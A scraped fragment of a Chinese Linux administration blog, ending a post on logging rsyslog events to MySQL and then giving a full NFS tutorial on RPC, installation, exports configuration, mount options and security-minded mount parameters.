Updated: httpd-tools-2.4.6-45.el7.centos.4.x86_64\rJun 2 05:48:03 lnmp yum[128171]: Updated: httpd-2.4.6-45.el7.centos.4.x86_64\rJun 2 05:48:03 lnmp systemd: Reloading.\rJun 2 05:48:04 lnmp systemd: Configuration file /usr/lib/systemd/system/auditd.service is marked world-inaccessible. This has no effect as configuration data is accessible via APIs without restrictions. Proceeding anyway.\r基于MySQL存储日志 将日志存储到数据库中需要加载相对应的模块\nrsyslog.x86_64 5.8.10-10.el6_6 base\rrsyslog-gnutls.x86_64 5.8.10-10.el6_6 base\rrsyslog-gssapi.x86_64 5.8.10-10.el6_6 base\rrsyslog-mysql.x86_64 5.8.10-10.el6_6 base\rrsyslog-pgsql.x86_64 5.8.10-10.el6_6 base\rrsyslog-relp.x86_64 5.8.10-10.el6_6 base\rrsyslog-snmp.x86_64 5.8.10-10.el6_6 base\r...\r安装rsyslog程序包 $ rpm -ql rsyslog-mysql\r/lib64/rsyslog/ommysql.so\r/usr/share/doc/rsyslog-mysql-5.8.10\r/usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql\r配置服务器端参数 $Modload ommysql\r*.info;mail.none;authpriv.none;cron.none :ommysql:localhost,Syslog,syslog,111\r导入数据库并授权 mysql \u0026lt; /usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql\rgrant all privileges on syslog.* to syslog@'localhost' identified by '111';\r查看结果\nmysql\u0026gt; select count(*) from systemevents;\r+----------+\r| count(*) |\r+----------+\r| 3 |\r+----------+\r1 row in set (0.00 sec)\r安装loganalyzer 下载 loganalyzer\nsh configure.sh\rsh secure.sh\rchmod 666 config.php\r","permalink":"https://www.oomkill.com/2016/04/syslog/","summary":"","title":"Linux日志管理 - syslog"},{"content":"NFS介绍 什么是NFS NFS是 Network File System 网络文件系统。它的主要功能是通过网络（一般是局域网）让不同的主机系统之间可以共享文件或目录。NFS客户端（一般为应用服务器，例如Web）可以通过挂载（mount）的方式将NFS服务器端共享的数据目录挂载到NFS客户端本地系统中（就是某一个挂载点下）。从客户端本地看，NFS服务器端共享的目录就好像是客户端自己的磁盘分区或者目录一样，而实际上却是远端的NFS服务器的目录。\n一般情况下，Windows网络共享服务或samba服务用于办公局域网共享，而互联网中小型网站集群架构后端常用NFS进行数据共享，如果是大型网站，那么有可能还会用到更复杂的分布式文件系统，例如：Moosefs（mfs）、GlusterFS、FastDFS。\nNFS的历史介绍 第一个网络文件系统被称为File Access Listener，由Digital Equipment Corporation（DEC）在1976年开发。\nNFS是第一个构建于IP协议之上的现代网络文件系统。在20世纪80年代，它首先作为实验的文件系统，由Sun Microsystems在内部完成开发。NFS协议归属于Request for Comments（RFC）标准，并且随后演化为NFSv2。作为一个标准，由于NFS与其他客户端和服务器的互操作能力很好而发展快速。\n之后，标准继续演化，成为NFSv3，在RFC1813中有定义。这一新的协议比以前的版本具有更好的可扩展性，支持大文件（超过2GB），异步写入，并且将TCP作为传输协议，为文件系统在更广泛的网络中使用铺平了道路。在2000年，RFC 3010（由RFC 3530修订）将NFS带入企业级应用。此时，Sun引入了具有较高安全性、带有状态协议的NFSv4（NFS之前的版本都是无状态的）。今天，NFS版本的4.1（由RFC 5661定义）增加了对跨越分布式服务器并行访问的支持（称为PNFS extension）。\nNFS系统已经历了近30年的发展。它代表了一个非常稳定的（及可移植）网络文件系统，具备可扩展、高性能等特性，并达到了企业级应用质量标准。由于网络速度的增加和延迟的降低，NFS系统一直是通过网络提供文件系统服务的有竞争力的选择，特别是在中小型互联网企业中，应用十分广泛。\nNFS在企业中的应用场景 在企业集群架构的工作场景中，NFS网络文件系统一般被用来存储共享视频、图片、附件等静态资源文件，通常网站用户上传的文件都会放到NFS共享里，例如：BBS产品的图片、附件、头像（注意网站BBS程序不要放在NFS共享里），然后前端所有的节点访问这些静态资源时都可读取NFS存储上的资源。NFS是当前互联网系统架构中最常用的数据存储服务之一，前面说过，中小型网站公司应用频率更高，大公司或门户除了使用NFS外，还可能会使用更为复杂的分布式文件系统，比如Moosefs（mfs）、GlusterFS、FastDFS等。\n企业生产集群为什么需要共享存储角色 例如：A用户传图片到Web1服务器，然后让B用户访问这张图片，结果B用户访问的请求分发到了Web2，因为Web2上没有这张图片，这就导致它无法看到A用户上传的图片，如果此时有一个共享存储，A用户上传图片的请求无论是分发到Web1还是Web2上，最终都会存储到共享存储上，而在B用户访问图片时，无论请求分发到Web1还是Web2上，最终也都会去共享存储上找，这样就可以访问到需要的资源了。这个共享存储的位置可以通过开源软件和商业硬件实现，互联网中小型集群架构会用普通PC服务器配置NFS网络文件系统实现。\n当集群中没有NFS共享存储时，用户访问图片的情况如图所示。\n如果集群中有NFS共享存储，用户访问图片的情况如图所示。\n中小型互联网企业一般不会买硬件存储，因为太贵，大公司如果业务发展很快的话，可能会临时买硬件存储顶一下网站的压力，当网站并发继续加大时，硬件存储的扩展相对就会很费劲，且价格成几何级数增加。例如：淘宝网就曾替换掉了很多硬件设备，比如，用LVS+Haproxy替换了netscaler负载均衡设备，用FastDFS、TFS配合PC服务器替换了netapp、emc等商业存储设备，去IOE正在成为互联网公司的主流。\nNFS系统原理介绍 NFS系统挂载结构图解与介绍 在NFS服务器端设置好一个共享目录/video后，其他有权限访问NFS服务器端的客户端都可以将这个共享目录/video挂载到客户端本地的某个挂载点（其实就是一个目录，这个挂载点目录可以自己随意指定），不同客户端的挂载点可以不相同。\n客户端正确挂载完毕后，就可以通过NFS客户端的挂载点所在的/v/video或/video目录查看到NFS服务器端/video共享出来的目录下的所有数据。在客户端上查看时，NFS服务器端的/video目录就相当于客户端本地的磁盘分区或目录，几乎感觉不到使用上的区别，根据NFS服务器端授予的NFS共享权限以及共享目录的本地系统权限，只要在指定的NFS客户端操作挂载/v/video或/video的目录，就可以将数据轻松地存取到NFS服务器端上的/video目录中了。\n什么是RPC 因为NFS支持的功能相当多，而不同的功能都会使用不同的程序来启动，每启动一个功能就会启用一些端口来传输数据，因此，NFS的功能所对应的端口无法固定，它会随机取用一些未被使用的端口来作为传输之用，其中CentOS 5.x的随机端口都小于1024，而CentOS 6.x的随机端口都是较大的。\n因为端口不固定，这样一来就会造成NFS客户端与NFS服务器端的通信障碍，因为NFS客户端必须要知道NFS服务器端的数据传输端口才能进行通信，才能交互数据。\n要解决上面的困扰，就需要通过远程过程调用RPC（Remote Proce-dure Call）服务来帮忙了，NFS的RPC服务最主要的功能就是记录每个NFS功能所对应的端口号，并且在NFS客户端请求时将该端口和功能对应的信息传递给请求数据的NFS客户端，从而确保客户端可以连接到正确的NFS端口上去，达到实现数据传输交互数据目的。这个RPC服务类似NFS服务器端和NFS客户端之间的一个中介，流程如图10-7所示。\n拿房屋中介打个比喻吧：假设我们要找房子，这里的我们就相当于NFS客户端，中介介绍房子，就相当于RPC服务，房子所有者房东就相当于NFS服务，租房的人找房子，就要找中介，中介要预先存有房子主人的信息，才能将房源信息告诉租房的人。\n那么RPC服务如何知道每个NFS的端口呢？\n当NFS服务器端启动服务时会随机取用若干端口，并主动向RPC服务注册取用的相关端口及功能信息，如此一来，RPC服务就知道NFS每个端口对应的NFS功能了，然后RPC服务使用固定的111端口来监听NFS客户端提交的请求，并将正确的NFS端口信息回复给请求的NFS客户端，这样一来，NFS客户端就可以与NFS服务器端进行数据传输了。\n在启动NFS Server之前，首先要启动RPC服务（CentOS 5.8下为portmap服务，CentOS 6.6下为rpcbind服务，下同），否则NFS Server就无法向RPC服务注册了。另外，如果RPC服务重新启动，原来已经注册好的NFS端口数据就会丢失，因此，此时RPC服务管理的NFS程序也需要重新启动以重新向RPC注册。要特别注意的是，一般修改NFS配置文件后，是不需要重启NFS的，直接在命令行执行/etc/init.d/nfs reload或exportfs-rv即可使修改的/etc/exports生效。\nNFS的工作流程原理 当访问程序通过NFS客户端向NFS服务器端存取文件时，其请求数据流程大致如下：\n1）首先用户访问网站程序，由程序在NFS客户端上发出存取NFS文件的请求，这时NFS客户端（即执行程序的服务器）的RPC服务（rpcbind服务）就会通过网络向NFS服务器端的RPC服务（rpcbind服务）的111端口发出NFS文件存取功能的询问请求。 2）NFS服务器端的RPC服务（rpcbind服务）找到对应的已注册的NFS端口后，通知NFS客户端的RPC服务（rpcbind服务）。 3）此时NFS客户端获取到正确的端口，并与NFS daemon联机存取数据。 4）NFS客户端把数据存取成功后，返回给前端访问程序，告知用户存取结果，作为网站用户，就完成了一次存取操作。 因为NFS的各项功能都需要向RPC服务（rpcbind服务）注册，所以只有RPC服务才能获取到NFS服务的各项功能对应的端口号（port number）、PID、NFS在主机所监听的IP等信息，而NFS客户端也只能通过向RPC服务询问才能找到正确的端口。也就是说，NFS需要有RPC服务的协助才能成功对外提供服务。从上面的描述，我们不难推断，无论是NFS客户端还是NFS服务器端，当要使用NFS时，都需要首先启动RPC服务，NFS服务必须在RPC服务启动之后启动，客户端无需启动NFS服务，但需要启动RPC服务。\n注意： NFS的RPC服务，在CentOS 5.X下名称为portmap，在CentOS 6.X下名称为rpcbind。\n安装NFS服务 搭建NFS环境准备 克隆虚拟机 克隆的虚拟机存在的网络问题 原因分析：\n使用VM的克隆功能，会为新产生的虚拟机配置一个与原始虚拟机网卡MAC地址不同的网卡。对于CentOS这样的Linux系统，会把运行时的网卡MAC地址记入/etc/udev/rules.d/70-persistent-net.rules文件中。这样克隆好的新系统里也保存了这个记录。\n当新系统启动时，由于vm已经为其配置了不同的MAC地址，因此系统会在启动扫描硬件时把这个新的MAC地址的网卡当做是eth1，并且增加记入上述文件中。而此时配置文件里的/etc/sysconfig/network-scripts/ifcfg-eth0里记录的还是原来的MAC地址，而这个MAC地址在新系统里是不存在的，所以无法启动。\n解决方法1\n删除里面的uuid，因为这个是唯一的值 更改HWaddr为eth1的值 重启系统后\n解决方法2 1.编辑eth0的配置文件：vi /etc/sysconfig/network-scripts/ifcfg-eth0 ,删除HWADDR地址那一行及UUID的行\n$ cat /etc/sysconfig/network-scripts/ifcfg-eth0\rDEVICE=eth0\rIPV6INIT=no\rUSERCTL=no\rHWADDR=00:0c:29:08:28:9f\rUUID=cee39dbb-6a10-4425-9daf-768b6e79a9c9\r2.清空 /etc/udev/rules.d/70-persistent-net.rules\n\u0026gt;/etc/udev/rules.d/70-persistent-net.rules\r3.重启系统\n注： 两种方法更改后重启网卡是不行的，必须重启系统\n安装NFS 要部署NFS服务，需要安装下面的软件包：\nnfs-utils：NFS服务的主程序，包括rpc.nfsd、rpc.mountd这两个daemons和相关文档说明，以及执行命令文件等。 rpcbind：CentOS 6.X下面RPC的主程序。NFS可以视为一个RPC程序，在启动任何一个RPC程序之前，需要做好端口和功能的对应映射工作，这个映射工作就是由rpcbind服务来完成的。因此，在提供NFS服务之前必须先启动rpcbind服务才行。 NFS安装的三种方式 检查软件是否安装\nrpm -qa nfs-utils rpcbind\ryum安装\nyum install nfs-utils rpcbind -y\r通过系统光盘里的rpm包安装，命令 nfs-utils-1.2.3-64.el6.x86_64\nyum grouplistgrep -i nfs\ryum groupinstall \u0026quot;NFS file server\u0026quot; -y\r启动NFS相关服务 启动rpcbind服务\n因为NFS及其辅助程序都是基于RPC（Remote Procedure Call）协议的（使用的端口为111），所以首先要确保系统中运行了rpcbind服务。\n/etc/init.d/rpcbind start /etc/init.d/rpcbind status\t#\u0026lt;==检查rpcbind服务状态\rrpcinfo -p localhost #\u0026lt;==rpcbind服务未启动检查rpcinfo信息的报错\rhttps://yd.baidu.com/view/38b81d255fbfc77da369b13c?cn=24-105,24-592\u0026pn=15 $ ps -ef|egrep \u0026quot;rpc|nfs\u0026quot;\rrpcuser 901 1 0 06:43 ? 00:00:00 rpc.statd \u0026lt;==检查文件一致性\rrpc 1071 1 0 07:24 ? 00:00:00 rpcbind\rroot 1101 2 0 07:24 ? 00:00:00 [rpciod/0]\rroot 1110 1 0 07:24 ? 00:00:00 rpc.rquotad\rroot 1115 1 0 07:24 ? 00:00:00 rpc.mountd\rroot 1122 2 0 07:24 ? 00:00:00 [nfsd4]\rroot 1123 2 0 07:24 ? 00:00:00 [nfsd4_callbacks]\rroot 1124 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1125 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1126 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1127 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1128 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1129 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1130 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1131 2 0 07:24 ? 00:00:00 [nfsd]\rroot 1158 1 0 07:24 ? 00:00:00 rpc.idmapd\r问：如何让rpcbind比nfs先启动？\n一般都是将启动命令放入rc.local中\n配置NFS nfs配置文件\n提示：NFS默认配置文件/etc/exports其实是存在的，但是没有内容，需要用户自行配置\n$ cat /etc/exports # NFS共享的目录 共享给谁(权限) NFS客户端地址1（参数1,参数2） NFS客户端地址2（参数1,参数2）\r/data 192.168.59.*(rw,sync)\r/data 10.1.1.1(rw,sync) NFS地址配置的详细说明\r客户端地址 具体地址 说明 授权单一客户端访问NFS 10.0.0.30 一般情况下生产环境中此配置不多 授权整个网段可访问NFS 10.0.0.0/24 其中24位255.255.255.0，指定网段为生产环境中最常见的配置。配置简单，维护方便 授权整个网段可访问NFS 10.0.0.0/24 其中24位255.255.255.0，指定网段为生产环境中最常见的配置。配置简单，维护方便 授权整个网段可访问NFS 10.0.0.* 指定网段的另外写法（不推荐使用） 授权某个域名客户端访问 nfs.bodboy.com 生产环境中一般情况下不常用。（域名可在hosts文件中解析） 授权整个域名客户端访问 *.oldboy.com 生产环境中一般情况下不常用 /etc/exports 文件格式配置实例说明\r常用格式说明 要共享的目录 客户端IP地址或IP段（参数1，参数2\u0026hellip;） 配置例一 /data 10.0.0.0/24(rw,sync) #\u0026lt;\u0026ndash; 允许客户端读写，并且数据同步写到服务器端磁盘里，注意，24和 ( 之间不能有空格 配置例二 /data 10.0.0.0/24(rw,sync,all_squash,anonuid=2000,anongid=2000) #\u0026lt;\u0026ndash;允许客户端读写，并且数据同步写到服务器端的磁盘里，并指定客户端的用户UID和GID。早期生产环境的一种配置，适合多客户端共享一个NFS服务单目录，如果所有服务器的nfsnobody账户UID都是65534，则本例没什么必要了。早期CentOS5.5的系统默认情况下nfsbobody的UID不一定是65534，此时如果这些服务器共享一个NFS目录，就会出现访问权限问题 配置例三 /home/oldbody 10.0.0.0/24(ro) #\u0026lt;\u0026ndash; 只读并共享\n用途：例如在生产环境中，开发人员有查看盛传服务器日志的需求，但有不希望给开发生产服务器的权限，那么就可以给开发提供某个测试服务器NFS客户端上查看某个生产服务器日志目录（NFS共享）的权限，当然这不是唯一的放法，例如可以把程序记录的日志发送到测试服务器供开发查看或者通过收集日志等其他方式展现 NFS常用配置参数权限\r参数选项 说明 ro 只读访问 rw 读写访问 sync 请求或写入数据时，数据同步写入到NFS服务器的硬盘后才返回。\n优点，数据安全不会丢，缺点，性能比不启用该参数要差 async 写入数据会先写到内存缓存区，直到硬盘有空挡才会再写入磁盘，这样可以提升写入效率！风险若为服务器宕机或不正常关机，会损失缓冲区中未写入磁盘的数据（解决方法：服务器主板点出或加UPS不间断电源） all_squash 不管访问NFS服务器共享目录的用户身份如歌，它的权限都将被压缩成匿名用户，同时它的UID和GID都会变成nfsnobody账号身份。在早期多个NFS客户端同时读写NFS服务器数据时，这个参数很有用\n在生产中配置NFS的重要技巧：\n1)确保所有客户端服务器对NFS共享目录具备想用的用户访问权限\na.all_squash把所有客户端都压缩成固定的匿名用户（UID相同）\nb.就是anonuid，anongid指定的UID和GID用户 2)所有的客户端和服务器端都需要有一个相同的UID和GID的用户，即nfsnobody（UID必须相同） no_all_squash 访问NFS服务器共享目录的用户如果是root的话，它对该共享目录具有root权限。这个配置原是为无盘客户端准备的。用户应该避免使用 root_squash 如果访问NFS服务器共享目录是root，则它的权限将被压缩成匿名用户，同时它的UID和GID通常会变成nfsnobody账号身份 anonuid=xxx 参数以anon*开头即指anonymous匿名用户，这个用户的UID设置值通常为nfsnobody的UID值，当然也可以自行设置这个UID值。但是，UID必须存在于/etc/passwd中。在多NFS客户端时，如多台webserver共享一个NFS目录，通过这个参数可以使得不同的NFS客户端写入的数据对所有NFS客户端保持永阳的用户权限，即为配置的匿名UID对应用户权限，这个参数很有用，一般默认即可 anonuid 同uid 配置服务器端 $ /etc/init.d/nfs reload = exportfs -rv（平滑生效）\rreload = exportfs -rv（平滑生效）位置\n检查挂载信息\n$ showmount -e 127.0.0.1\rExport list for 127.0.0.1:\r/data 192.168.59.*\r执行挂载命令\n$ mount -t nfs 192.168.59.133:/data /mnt\r查看挂载结果\n$ df -h\rFilesystem Size Used Avail Use% Mounted on\r/dev/sda3 9.1G 1.5G 7.2G 17% /\rtmpfs 242M 0 242M 0% /dev/shm\r/dev/sda1 190M 27M 153M 16% /boot\r192.168.59.133:/data 9.1G 1.5G 7.2G 17% /mnt\r配置客户端 开启rpcbind\n$ /etc/init.d/rpcbind start\r正在启动 rpcbind：[确定]\r将rpcbind服务设置为开机自启动\n$ vi /etc/rc.local #!/bin/sh\r#\r# This script will be executed *after* all the other init scripts.\r# You can put your own initialization stuff in here if you don't\r# want to do the full Sys V style init stuff.\rtouch /var/lock/subsys/local\r/etc/init.d/rpcbind start\r查看挂载信息\n$ showmount -e 192.168.59.133\rExport list for 192.168.59.133:\r/data 192.168.59.*\r设置挂载\n$ mount -t nfs 192.168.59.133:/data /mnt\r$ df -h\rFilesystem Size Used Avail Use% Mounted on\r/dev/sda3 9.1G 1.4G 7.2G 17% /\rtmpfs 242M 0 242M 0% /dev/shm\r/dev/sda1 190M 27M 153M 16% /boot\r192.168.59.133:/data 9.1G 1.5G 7.2G 17% /mnt\r切换到挂载的目录\n$ cd /mnt\r查看nfs服务器文件列表\n$ ls\ra.log\r解决不能写的问题\n$ vi /var/lib/nfs/etab /data 192.168.59.*(rw,sync,wdelay,hide,nocrossmnt,secure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,anonuid=65534,anongid=65534,sec=sys,rw,root_squash,no_all_squash)\r$ grep 65534 /etc/passwd\rnfsnobody❌65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\r# 将目录所属用户设置为nfsnobody\r$ chown -R nfsnobody /data\r# 查看设置结果\r$ ls -l /\rdrwxr-xr-x. 2 nfsnobody root 4096 4月 8 21:54 data\r# 在客户端创建一个文件\r$ touch b.txt\r# 在服务器端查看\r$ ls\rb.txt\r重启后挂载失效\n在 /etc/rc.loacl 中挂载，不要在fstab中，因为linux启动过程，fstab先启动。网络是后启动的，网络磁盘是挂不上的\n挂载服务器断\nmount -t nfs 192.168.59.133:/data /mnt\r$ cat /proc/mounts\rrootfs / rootfs rw 0 0\rproc /proc proc rw,relatime 0 0\rsysfs /sys sysfs rw,seclabel,relatime 0 0\rdevtmpfs /dev devtmpfs rw,seclabel,relatime,size=235908k,nr_inodes=58977,mode=755 0 0\rdevpts /dev/pts devpts rw,seclabel,relatime,gid=5,mode=620,ptmxmode=000 0 0\rtmpfs /dev/shm tmpfs rw,seclabel,relatime 0 0\r/dev/sda3 / ext4 rw,seclabel,relatime,barrier=1,data=ordered 0 0\rnone /selinux selinuxfs rw,relatime 0 0\rdevtmpfs /dev devtmpfs rw,seclabel,relatime,size=235908k,nr_inodes=58977,mode=755 0 0\r/proc/bus/usb /proc/bus/usb usbfs rw,relatime 0 0\r/dev/sda1 /boot ext4 rw,seclabel,relatime,barrier=1,data=ordered 0 0\rnone /proc/sys/fs/binfmt_misc binfmt_misc rw,relatime 0 0\rsunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0\rnfsd /proc/fs/nfsd nfsd rw,relatime 0 0\r192.168.59.133:/data/ /mnt nfs4 rw,relatime,vers=4,rsize=4096,wsize=1024,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=192.168.59.133,minorversion=0,local_lock=none,addr=192.168.59.133 0 0\r$ cd /mnt\r$ umount /mnt\rumount.nfs: /mnt: device is busy\rumount.nfs: /mnt: device is busy\r$ umount -lf /mnt\r$ df -h\rFilesystem Size Used Avail Use% Mounted on\r/dev/sda3 9.1G 1.5G 7.2G 17% /\rtmpfs 242M 0 242M 0% /dev/shm\r/dev/sda1 190M 27M 153M 16% /boot\rNFS挂载参数说明\r参数 参数功能 默认参数 fg/bg 当在客户端执行挂载时，可选择时前台（fg）还是后台（bg）执行。若在前台执行，则mount会持续尝试挂载，直到成功或挂载时间超时为止，若在后台执行，则mount会在后台持续多次进行mount，而不会影响到前台的其他程序操作。如果网络联机不稳定，或是服务器常常需要开关机，建议使用bg比较妥当 fg soft/hard 当NFS客户端以soft挂载服务器时，若网络或服务器出现问题，造成客户端与服务器之间无法传输资料，客户端就会一直尝试，直到timeout（超时时间）后显示错误才停止。若使用soft mount的话，可能会在timeout出现时造成资料丢失，故一般不建议使用。若用hard模式挂载硬盘时，刚与soft相反，此时客户端会一直尝试连线倒服务器，若服务器有回应就继续刚才的操作，若没有回应NFS客户端会一直尝试，此时无法umount或kill，所以常常会配合intr使用 hard intr 当使用hard挂载的资源timeout后，若有指定intr参数，可以在timeout后把它中断掉，这避免出问题时系统整个被NFS锁死，建议使用intr 无 rsize/wsize 读出（rsize）与写入（wsize）的区块大小（block size），这个设置值可以影响客服端与服务器传输数据的传冲存储量，一般来说，如果在局域网内，别且客户端与服务器端都具有足够的内存，这个值可以设置大一点，比如65535（bytes），提升缓冲区块将提升NFS文件系统的传输能力。但设置的值也不要太大，最好以网络能够传输的最大值为限 CentOS5X：默认值\nrsize=1024\nwsize=1024\nCentOS6：默认值\nrsize=131072\nwsize=131072 proto 使用UDP协定来传输资料，在LAN中会有比较好的性能。若要跨越Internet的话，使用proto=tcp多传输的数据会有比较好的纠错能力 proto=tcp 通过man nfs查看上述参数信息。如果追求极致，可以用如下参数挂载\nmount -t nfs -o fg,hard,intr,rsize=1111,wsize=1111 10.0.0.7:/data /mnt\r如果考虑简单、易用为原则，直接选择默认值\nmount -t nfs 10.0.0.7:/data /mnt\rmount -o 参数对应的选项\r参数 参数意义 系统默认值 suid/nosuid 当挂载的文件系统上有任何SUID的程序时，只要使用nosuid就能够取消设置SUID功能 suid rw/ro 可以指定文件系统是只读或可写 rw dev/nodev 是否可以保留装置文件的特殊功能？一般来说只有/dev才会有特殊的装置，因此可选择nodev dev exec/noexec 是否具有执行文件权限？如果想要挂载的文件时普通的资源区（例如：图片、附件），那个可以选择noexec exec user/nouser 是否允许用户拥有文件的挂载与卸载功能？如果要保护文件系统，最好不要为用户提供挂载与卸载功能 nouer auto/noauto 这个auto是指“mount -a”时会不会被挂载的项目，如果不需要这个分区随时被挂载，可以设置为noauto\tauto default 这个是fstab里面的默认值，包括rw、suid、dev、exec、auto、nouser、async默认情况下大部分都是默认值 noatime/atime atime:在每一次数据访问时，会永不更新访问文件的inode时间戳，在高并发情况下，建议通过加上noatime来取消这个默认项，已到提升I/O性能，优化I/O的目的\nnoatime：访问文件不更新文件的inode时间戳，高并发环境，推荐显示应用该选项，可提高磁盘I/O性能 atime sync/async 该参数与async相反。有I/O操作时，会同步处理I/O即吧数据同步写入硬盘。次参数会牺牲一点I/O性能，但是，换来的时断电后数据的安全性。 sync：涉及文件I/O的操作都是异步处理，即不会写到磁盘，此参数会提高性能，但会降低数据安全。一般情况，生产环境不推荐使用。除非对性能要求很高，对数据可靠性不要求场合 问：在企业生产环境中，NFS客户端挂载有没有必要加某些参数，如：noexec、nosuid、bg、soft、rsize、wsize等参数，有书上说建议加rsize、wszie这两个参数\n这个问题属于mount挂载优化内容（有些参数也适合其他文件系统），一般来说要适当加挂载参数，但是，最好先做测试，用数据来说话，才能更好的确定到底是挂载还是不挂载。\n有关安全挂载参数选项 在工作环境，一般来说，NFS服务器共享的只是普通静态数据（图片、附件、视频）不需要执行suid、exec等权限。挂载的这个文件系统时能作为数据存取只用，无法执行程序，对于客户端来讲增加了安全性，例如：很多木马篡改文件都是由上传入口上传的程序倒存储目录然后执行的。 因此在挂载的时候用下面的命令很有必要\nmount -t nfs -o noexec,nosuid,nodev,rw 10.0.0.7:/data /mnt\r注：通过mount -o指定挂载参数与/etc/fstab里指定挂载参数的效果是一样的。\n挂载性能优化参数\n禁止更新目录及文件时间戳挂载\nmount -t nfs -o noatime,nodiratime 10.0.0.7:/data /mnt\r安全加优化的挂载方法如下\nmount -t nfs -o nosuid,noexec,nodev,noatime,nodiratime,intr,rsize=131072,wsize=131072 10.0.0.7:/data /mnt\rNFS优缺点\n优点：\n简单易上手，容易掌握 数据可见 部署快速，维护简单，且可控，满足需求就是最好的 可靠，从软件层面上来看，数据可靠性高，经久耐用。数据实在文件系统之上的。 服务非常稳定 缺点：\n存在单点故障，服务器宕机，所有的客户端都不能访问共享目录 在大数据高并发的场合，NFS效率、性能有限（2000W/日以下的PV网站不是瓶颈。除非网站架构设计太差） 安全性一般等 ","permalink":"https://www.oomkill.com/2016/04/nfs-network-filesystem/","summary":"","title":"网络文件系统 - NFS"}]